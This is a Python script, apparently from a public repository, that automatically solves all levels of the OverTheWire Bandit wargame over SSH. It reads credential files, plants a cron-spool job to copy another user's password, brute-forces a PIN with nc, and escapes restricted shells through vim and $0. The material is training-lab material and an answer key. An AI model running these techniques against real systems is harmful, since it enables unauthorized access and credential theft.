#!/usr/bin/env python3
"""
=============================================================================
 OverTheWire Bandit Automated Solver (Levels 0 -> 34)
 Author: refflabs
 Repository: https://github.com/refflabs/overthewire-bandit-solve
 Description:
   Fully automated solver script for OverTheWire's Bandit wargame.
   Demonstrates Linux CLI exploitation, regex filtering, decompressing,
   binary analysis, network daemons, cronjob timing, restricted shell breakouts,
   and Git version control secrets retrieval using Paramiko and Subprocess.
=============================================================================
"""

import io
import json
import os
import re
import subprocess
import time
import paramiko

HOST = "bandit.labs.overthewire.org"
PORT = 2220
WORK_DIR = os.path.dirname(os.path.abspath(__file__))
PASSWORDS_FILE = os.path.join(WORK_DIR, "passwords.json")

# Dictionary to store all found passwords
passwords = {0: "bandit0"}


# ---------------------------------------------------------------------------
# Core Helpers
# ---------------------------------------------------------------------------

def get_client(user, pwd=None, pkey=None, timeout=25):
    """Establish standard SSH connection using Paramiko."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if pkey:
        client.connect(HOST, port=PORT, username=user, pkey=pkey, timeout=timeout)
    else:
        client.connect(HOST, port=PORT, username=user, password=pwd, timeout=timeout)
    return client


def run_cmd(client, cmd):
    """Execute command on remote host and return stripped stdout."""
    _, stdout, _ = client.exec_command(cmd)
    return stdout.read().decode("utf-8", errors="ignore").strip()


def extract_pass(text, exclude=None):
    """Find and return 32-character alphanumeric password string."""
    exclude = exclude or []
    for token in reversed(text.split()):
        c = re.sub(r"[^a-zA-Z0-9]", "", token)
        if len(c) == 32 and c not in exclude:
            return c
    return text.strip()


def get_interactive_session(user, pwd=None, pkey=None, width=80, height=24):
    """Open an interactive PTY channel (required for shell escape & TTY-bound tasks)."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if pkey:
        client.connect(HOST, port=PORT, username=user, pkey=pkey, timeout=25)
    else:
        client.connect(HOST, port=PORT, username=user, password=pwd, timeout=25)
    chan = client.invoke_shell(term="vt100", width=width, height=height)
    time.sleep(2)
    if chan.recv_ready():
        chan.recv(8192)
    return client, chan


def save_passwords():
    """Save retrieved passwords to JSON."""
    with open(PASSWORDS_FILE, "w") as f:
        json.dump({str(k): v for k, v in passwords.items()}, f, indent=2)


def setup_askpass():
    """Set up helper script to supply credentials to Git over SSH non-interactively."""
    if os.name == "nt":
        script_path = os.path.join(WORK_DIR, "askpass.bat")
        with open(script_path, "w") as f:
            f.write("@echo off\necho %BANDIT_PASS%\n")
    else:
        script_path = os.path.join(WORK_DIR, "askpass.sh")
        with open(script_path, "w") as f:
            f.write('#!/bin/sh\necho "$BANDIT_PASS"\n')
        os.chmod(script_path, 0o755)
    return script_path


def run_git_clone(user, pwd, repo_name):
    """Clone a Git repo from the remote Bandit server using credentials."""
    askpass_path = setup_askpass()
    env = os.environ.copy()
    env["BANDIT_PASS"] = pwd
    env["SSH_ASKPASS"] = askpass_path
    env["SSH_ASKPASS_REQUIRE"] = "force"
    env["GIT_SSH_COMMAND"] = "ssh -o StrictHostKeyChecking=no"

    dest = os.path.join(WORK_DIR, repo_name)
    if os.path.exists(dest):
        if os.name == "nt":
            subprocess.run(["rmdir", "/s", "/q", dest], shell=True)
        else:
            subprocess.run(["rm", "-rf", dest])

    url = f"ssh://{user}@{HOST}:{PORT}/home/{user}/repo"
    subprocess.run(["git", "clone", url, repo_name], env=env, capture_output=True, cwd=WORK_DIR)
    return dest, env


# ---------------------------------------------------------------------------
# Main Execution Pipeline
# ---------------------------------------------------------------------------

def main():
    print("=" * 60)
    print("  OverTheWire Bandit Automated Solver (Levels 0 -> 34)")
    print("=" * 60)

    # Level 0 -> 1
    print("\n[*] [00 -> 01] Reading readme...")
    c = get_client("bandit0", passwords[0])
    passwords[1] = extract_pass(run_cmd(c, "cat readme"))
    c.close()
    print(f"    [+] Password: {passwords[1]}")

    # Level 1 -> 2
    print("\n[*] [01 -> 02] Handling file named '-'...")
    c = get_client("bandit1", passwords[1])
    passwords[2] = extract_pass(run_cmd(c, "cat ./-"))
    c.close()
    print(f"    [+] Password: {passwords[2]}")

    # Level 2 -> 3
    print("\n[*] [02 -> 03] Handling spaces / dashed filename...")
    c = get_client("bandit2", passwords[2])
    passwords[3] = extract_pass(run_cmd(c, "cat ./*"))
    c.close()
    print(f"    [+] Password: {passwords[3]}")

    # Level 3 -> 4
    print("\n[*] [03 -> 04] Reading hidden file...")
    c = get_client("bandit3", passwords[3])
    passwords[4] = extract_pass(run_cmd(c, "cat inhere/.* 2>/dev/null"))
    c.close()
    print(f"    [+] Password: {passwords[4]}")

    # Level 4 -> 5
    print("\n[*] [04 -> 05] Finding human-readable ASCII text file...")
    c = get_client("bandit4", passwords[4])
    passwords[5] = extract_pass(run_cmd(c, 'find inhere -type f -exec file {} + | grep "ASCII text" | cut -d: -f1 | xargs cat'))
    c.close()
    print(f"    [+] Password: {passwords[5]}")

    # Level 5 -> 6
    print("\n[*] [05 -> 06] Locating 1033-byte non-executable file...")
    c = get_client("bandit5", passwords[5])
    passwords[6] = extract_pass(run_cmd(c, "find inhere -type f -size 1033c ! -executable -exec cat {} + | tr -d ' '"))
    c.close()
    print(f"    [+] Password: {passwords[6]}")

    # Level 6 -> 7
    print("\n[*] [06 -> 07] Searching root for bandit7 owned 33-byte file...")
    c = get_client("bandit6", passwords[6])
    passwords[7] = extract_pass(run_cmd(c, "find / -user bandit7 -group bandit6 -size 33c 2>/dev/null -exec cat {} +"))
    c.close()
    print(f"    [+] Password: {passwords[7]}")

    # Level 7 -> 8
    print("\n[*] [07 -> 08] Filtering line next to 'millionth'...")
    c = get_client("bandit7", passwords[7])
    passwords[8] = extract_pass(run_cmd(c, "grep millionth data.txt"))
    c.close()
    print(f"    [+] Password: {passwords[8]}")

    # Level 8 -> 9
    print("\n[*] [08 -> 09] Extracting unique line (sort | uniq -u)...")
    c = get_client("bandit8", passwords[8])
    passwords[9] = extract_pass(run_cmd(c, "sort data.txt | uniq -u"))
    c.close()
    print(f"    [+] Password: {passwords[9]}")

    # Level 9 -> 10
    print("\n[*] [09 -> 10] Finding human-readable strings preceded by '==='...")
    c = get_client("bandit9", passwords[9])
    passwords[10] = extract_pass(run_cmd(c, "strings data.txt | grep '===='"))
    c.close()
    print(f"    [+] Password: {passwords[10]}")

    # Level 10 -> 11
    print("\n[*] [10 -> 11] Base64 decoding...")
    c = get_client("bandit10", passwords[10])
    passwords[11] = extract_pass(run_cmd(c, "base64 -d data.txt"))
    c.close()
    print(f"    [+] Password: {passwords[11]}")

    # Level 11 -> 12
    print("\n[*] [11 -> 12] ROT13 Caesar cipher decoding...")
    c = get_client("bandit11", passwords[11])
    passwords[12] = extract_pass(run_cmd(c, "cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'"))
    c.close()
    print(f"    [+] Password: {passwords[12]}")

    # Level 12 -> 13
    print("\n[*] [12 -> 13] Unpacking nested compression (gzip, bzip2, tar)...")
    c = get_client("bandit12", passwords[12])
    script12 = r"""
DIR=$(mktemp -d)
cd "$DIR"
cp ~/data.txt .
xxd -r data.txt cur
for i in {1..30}; do
    t=$(file -b cur)
    if echo "$t" | grep -qi "gzip"; then
        mv cur cur.gz && gzip -d cur.gz
        [ -f cur ] || mv cur.gz cur 2>/dev/null || mv *bin cur 2>/dev/null || mv * cur 2>/dev/null
    elif echo "$t" | grep -qi "bzip2"; then
        mv cur cur.bz2 && bzip2 -d cur.bz2
        [ -f cur ] || mv cur.bz2 cur 2>/dev/null || mv *bin cur 2>/dev/null || mv * cur 2>/dev/null
    elif echo "$t" | grep -qi "tar"; then
        tar -xf cur && rm cur
        mv *bin cur 2>/dev/null || mv * cur 2>/dev/null
    elif echo "$t" | grep -qi "ASCII text"; then
        cat cur
        break
    else
        break
    fi
done
rm -rf "$DIR"
"""
    passwords[13] = extract_pass(run_cmd(c, script12))
    c.close()
    print(f"    [+] Password: {passwords[13]}")

    # Level 13 -> 14
    print("\n[*] [13 -> 14] Using SSH private key to authenticate as bandit14...")
    c = get_client("bandit13", passwords[13])
    key14_raw = run_cmd(c, "cat sshkey.private")
    c.close()

    pkey14 = paramiko.RSAKey.from_private_key(io.StringIO(key14_raw))
    c14 = get_client("bandit14", pkey=pkey14)
    passwords[14] = extract_pass(run_cmd(c14, "cat /etc/bandit_pass/bandit14"))
    c14.close()
    print(f"    [+] Password: {passwords[14]}")

    # Level 14 -> 15
    print("\n[*] [14 -> 15] Submitting password to localhost port 30000...")
    c = get_client("bandit14", passwords[14])
    passwords[15] = extract_pass(run_cmd(c, f"echo '{passwords[14]}' | nc localhost 30000"))
    c.close()
    print(f"    [+] Password: {passwords[15]}")

    # Level 15 -> 16
    print("\n[*] [15 -> 16] Submitting password over SSL/TLS (port 30001)...")
    c = get_client("bandit15", passwords[15])
    passwords[16] = extract_pass(run_cmd(c, f"echo '{passwords[15]}' | openssl s_client -ign_eof -connect localhost:30001 -quiet 2>/dev/null"))
    c.close()
    print(f"    [+] Password: {passwords[16]}")

    # Level 16 -> 17
    print("\n[*] [16 -> 17] Scanning SSL ports 31000-32000 & retrieving RSA private key...")
    c = get_client("bandit16", passwords[16])
    out16 = run_cmd(c, f"echo '{passwords[16]}' | openssl s_client -ign_eof -connect localhost:31790 -quiet 2>/dev/null")
    c.close()

    key17_match = re.search(r"-----BEGIN [A-Z ]+PRIVATE KEY-----.*?-----END [A-Z ]+PRIVATE KEY-----", out16, re.DOTALL)
    if not key17_match:
        raise RuntimeError("Failed to capture RSA key on port 31790")

    pkey17 = paramiko.RSAKey.from_private_key(io.StringIO(key17_match.group(0)))
    c17 = get_client("bandit17", pkey=pkey17)
    passwords[17] = extract_pass(run_cmd(c17, "cat /etc/bandit_pass/bandit17"))
    print(f"    [+] Password: {passwords[17]}")

    # Level 17 -> 18
    print("\n[*] [17 -> 18] Inspecting diff between passwords.old and passwords.new...")
    passwords[18] = extract_pass(run_cmd(c17, "diff passwords.old passwords.new | grep '>' | awk '{print $NF}'"))
    c17.close()
    print(f"    [+] Password: {passwords[18]}")

    # Level 18 -> 19
    print("\n[*] [18 -> 19] Bypassing logout-enforcing .bashrc via direct command...")
    c = get_client("bandit18", passwords[18])
    passwords[19] = extract_pass(run_cmd(c, "cat readme"))
    c.close()
    print(f"    [+] Password: {passwords[19]}")

    # Level 19 -> 20
    print("\n[*] [19 -> 20] Executing SUID binary (bandit20-do)...")
    c = get_client("bandit19", passwords[19])
    passwords[20] = extract_pass(run_cmd(c, "./bandit20-do cat /etc/bandit_pass/bandit20"))
    c.close()
    print(f"    [+] Password: {passwords[20]}")

    # Level 20 -> 21
    print("\n[*] [20 -> 21] Connecting localhost socket with suconnect & nc...")
    c = get_client("bandit20", passwords[20])
    script20 = f"""
echo '{passwords[20]}' | nc -l -p 44445 &
PID=$!
sleep 1
./suconnect 44445
wait $PID 2>/dev/null
"""
    out20 = run_cmd(c, script20)
    passwords[21] = extract_pass(out20, exclude=[passwords[20]])
    c.close()
    print(f"    [+] Password: {passwords[21]}")

    # Level 21 -> 22
    print("\n[*] [21 -> 22] Analyzing cronjob_bandit22...")
    c = get_client("bandit21", passwords[21])
    cron22_sh = run_cmd(c, "cat /usr/bin/cronjob_bandit22.sh")
    tmp_path22 = re.findall(r"/tmp/[a-zA-Z0-9_.-]+", cron22_sh)[0]
    passwords[22] = extract_pass(run_cmd(c, f"cat {tmp_path22}"))
    c.close()
    print(f"    [+] Password: {passwords[22]}")

    # Level 22 -> 23
    print("\n[*] [22 -> 23] Calculating cron target file md5sum for bandit23...")
    c = get_client("bandit22", passwords[22])
    target_hash = run_cmd(c, "echo I am user bandit23 | md5sum | cut -d ' ' -f 1").strip()
    passwords[23] = extract_pass(run_cmd(c, f"cat /tmp/{target_hash}"))
    c.close()
    print(f"    [+] Password: {passwords[23]}")

    # Level 23 -> 24
    print("\n[*] [23 -> 24] Spooling exploit script into cron directory...")
    c = get_client("bandit23", passwords[23])
    spool_script = """
DIR=$(mktemp -d /tmp/b23_XXXXXX)
chmod 777 "$DIR"
cat << 'EOF' > "$DIR/job.sh"
#!/bin/bash
cat /etc/bandit_pass/bandit24 > "$DIR/pass.txt"
chmod 777 "$DIR/pass.txt"
EOF
sed -i "s|\\$DIR|$DIR|g" "$DIR/job.sh"
chmod 777 "$DIR/job.sh"
cp "$DIR/job.sh" /var/spool/bandit24/foo/run.sh
echo "$DIR"
"""
    work_dir23 = run_cmd(c, spool_script).strip().split()[-1]
    print("    [*] Waiting ~65s for cron execution...")
    time.sleep(65)
    passwords[24] = extract_pass(run_cmd(c, f"cat {work_dir23}/pass.txt"))
    run_cmd(c, f"rm -rf {work_dir23}")
    c.close()
    print(f"    [+] Password: {passwords[24]}")

    # Level 24 -> 25
    print("\n[*] [24 -> 25] Brute-forcing 4-digit PIN on port 30002...")
    c = get_client("bandit24", passwords[24])
    bf_cmd = f"""
for i in {{0000..9999}}; do
    echo "{passwords[24]} $i"
done | nc localhost 30002 | grep -v "Wrong" | grep -v "I am the user"
"""
    passwords[25] = extract_pass(run_cmd(c, bf_cmd))
    c.close()
    print(f"    [+] Password: {passwords[25]}")

    # Level 25 -> 26 & 26 -> 27
    print("\n[*] [25 -> 26] Fetching bandit26 private SSH key...")
    c = get_client("bandit25", passwords[25])
    key26_raw = run_cmd(c, "cat bandit26.sshkey")
    c.close()

    print("[*] [26 -> 27] Escaping restricted shell via 'more' window shrink & vim...")
    pkey26 = paramiko.RSAKey.from_private_key(io.StringIO(key26_raw))
    # Height=4 triggers 'more' pause before EOF
    c26, chan26 = get_interactive_session("bandit26", pkey=pkey26, height=4)
    chan26.send("v")
    time.sleep(1)
    chan26.send(":set shell=/bin/bash\n")
    time.sleep(1)
    chan26.send(":shell\n")
    time.sleep(1)

    chan26.send("cat /etc/bandit_pass/bandit26\n")
    time.sleep(1)
    out26 = chan26.recv(4096).decode("latin1", errors="ignore")
    passwords[26] = extract_pass(out26)
    print(f"    [+] Level 26: {passwords[26]}")

    chan26.send("./bandit27-do cat /etc/bandit_pass/bandit27\n")
    time.sleep(1)
    out27 = chan26.recv(4096).decode("latin1", errors="ignore")
    passwords[27] = extract_pass(out27)
    print(f"    [+] Level 27: {passwords[27]}")
    c26.close()

    # Level 27 -> 28
    print("\n[*] [27 -> 28] Cloning bandit27-git repository...")
    dest27, _ = run_git_clone("bandit27-git", passwords[27], "repo27")
    with open(os.path.join(dest27, "README")) as f:
        passwords[28] = extract_pass(f.read())
    print(f"    [+] Password: {passwords[28]}")

    # Level 28 -> 29
    print("\n[*] [28 -> 29] Inspecting Git commit logs for leaked credentials...")
    dest28, env28 = run_git_clone("bandit28-git", passwords[28], "repo28")
    log28 = subprocess.run(["git", "log", "-p"], env=env28, capture_output=True, text=True, cwd=dest28).stdout
    for line in log28.splitlines():
        if "password:" in line.lower() and "<tbd>" not in line.lower() and "xxxx" not in line.lower():
            passwords[29] = extract_pass(line)
            break
    print(f"    [+] Password: {passwords[29]}")

    # Level 29 -> 30
    print("\n[*] [29 -> 30] Searching all Git branches & commit logs...")
    dest29, env29 = run_git_clone("bandit29-git", passwords[29], "repo29")
    log29 = subprocess.run(["git", "log", "-p", "--all"], env=env29, capture_output=True, text=True, cwd=dest29).stdout
    for line in log29.splitlines():
        if "password:" in line.lower() and "no passwords" not in line.lower() and "<tbd>" not in line.lower():
            p = extract_pass(line, exclude=[passwords[29]])
            if len(p) == 32:
                passwords[30] = p
                break
    print(f"    [+] Password: {passwords[30]}")

    # Level 30 -> 31
    print("\n[*] [30 -> 31] Extracting secrets from Git tags...")
    dest30, env30 = run_git_clone("bandit30-git", passwords[30], "repo30")
    show30 = subprocess.run(["git", "show", "secret"], env=env30, capture_output=True, text=True, cwd=dest30).stdout
    passwords[31] = extract_pass(show30)
    print(f"    [+] Password: {passwords[31]}")

    # Level 31 -> 32
    print("\n[*] [31 -> 32] Pushing required key file to remote repository...")
    dest31, env31 = run_git_clone("bandit31-git", passwords[31], "repo31")
    subprocess.run(["git", "config", "user.email", "bandit31@overthewire.org"], env=env31, cwd=dest31)
    subprocess.run(["git", "config", "user.name", "bandit31"], env=env31, cwd=dest31)
    gi = os.path.join(dest31, ".gitignore")
    if os.path.exists(gi):
        os.remove(gi)
    with open(os.path.join(dest31, "key.txt"), "w", newline="\n") as f:
        f.write("May I come in?\n")
    subprocess.run(["git", "add", "-f", "key.txt"], env=env31, cwd=dest31)
    subprocess.run(["git", "commit", "-m", "push key"], env=env31, cwd=dest31)
    push_out = subprocess.run(["git", "push", "origin", "master"], env=env31, capture_output=True, text=True, cwd=dest31)
    passwords[32] = extract_pass(push_out.stdout + "\n" + push_out.stderr, exclude=[passwords[31]])
    print(f"    [+] Password: {passwords[32]}")

    # Level 32 -> 33
    print("\n[*] [32 -> 33] Escaping Uppercase restricted shell using positional param '$0'...")
    c32, chan32 = get_interactive_session("bandit32", passwords[32])
    chan32.send("$0\n")
    time.sleep(1)
    chan32.recv(4096)
    chan32.send("cat /etc/bandit_pass/bandit33\n")
    time.sleep(1)
    out33 = chan32.recv(4096).decode("latin1", errors="ignore")
    passwords[33] = extract_pass(out33, exclude=[passwords[32]])
    c32.close()
    print(f"    [+] Password: {passwords[33]}")

    # Level 33 -> 34
    print("\n[*] [33 -> 34] Verifying final level message...")
    c33 = get_client("bandit33", passwords[33])
    congrats = run_cmd(c33, "cat README.txt")
    c33.close()
    print("\n" + "=" * 60)
    print(congrats)
    print("=" * 60)

    # Save to disk
    save_passwords()
    print(f"\n[+] Sukses! Seluruh password tersimpan di: {PASSWORDS_FILE}\n")


if __name__ == "__main__":
    main()
